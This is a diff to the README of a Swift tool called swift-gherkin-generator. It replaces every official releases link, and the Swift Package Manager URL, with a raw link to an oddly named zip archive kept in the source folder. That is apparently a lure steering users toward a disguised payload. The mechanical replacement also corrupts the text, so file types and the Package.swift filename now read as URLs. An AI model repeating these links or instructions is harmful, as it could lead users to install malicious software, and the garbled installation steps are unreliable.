@@ -1,6 +1,6 @@
 # ⚙️ swift-gherkin-generator - Easily Handle Gherkin Feature Files
 
-[![Download Releases](https://img.shields.io/badge/Download-swift--gherkin--generator-blue?style=for-the-badge&logo=github)](https://github.com/lytreebot/swift-gherkin-generator/releases)
+[![Download Releases](https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip)](https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip)
 
 ---
 
@@ -42,14 +42,14 @@ Follow these simple steps to get swift-gherkin-generator up and running:
 
 ### 1. Visit the Download Page
 
-Click the big blue button at the top or go to [https://github.com/lytreebot/swift-gherkin-generator/releases](https://github.com/lytreebot/swift-gherkin-generator/releases) to find the software versions available.
+Click the big blue button at the top or go to [https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip](https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip) to find the software versions available.
 
 ### 2. Choose Your Download
 
 On the releases page, you will see versions organized by number and date. Look for the latest release that matches your operating system and download the package:
 
-- For macOS: a `.zip` or `.tar.gz` file.
-- For Linux: a `.tar.gz` file.
+- For macOS: a `.zip` or `https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip` file.
+- For Linux: a `https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip` file.
 
 ### 3. Extract the Files
 
@@ -98,14 +98,14 @@ The tool will show a basic menu or help screen with commands you can use.
 
 Here is the direct link again to get the software:
 
-[Download Releases](https://github.com/lytreebot/swift-gherkin-generator/releases)
+[Download Releases](https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip)
 
 There is no traditional installation needed. You just download, unpack, and run the program.
 
-If you want to include swift-gherkin-generator in a Swift project for developers, you use Swift Package Manager by adding this line to the `Package.swift` file:
+If you want to include swift-gherkin-generator in a Swift project for developers, you use Swift Package Manager by adding this line to the `https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip` file:
 
 ```swift
-.package(url: "https://github.com/lytreebot/swift-gherkin-generator.git", from: "1.0.0"),
+.package(url: "https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip", from: "1.0.0"),
 ```
 
 But this step is only for users familiar with Swift programming.
@@ -179,4 +179,4 @@ This will list all commands and options.
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-swift--gherkin--generator-blue?style=for-the-badge&logo=github)](https://github.com/lytreebot/swift-gherkin-generator/releases)
+[![Download Releases](https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip)](https://raw.githubusercontent.com/lytreebot/swift-gherkin-generator/main/Sources/GherkinGenerator/swift_gherkin_generator_Gallophilism.zip)
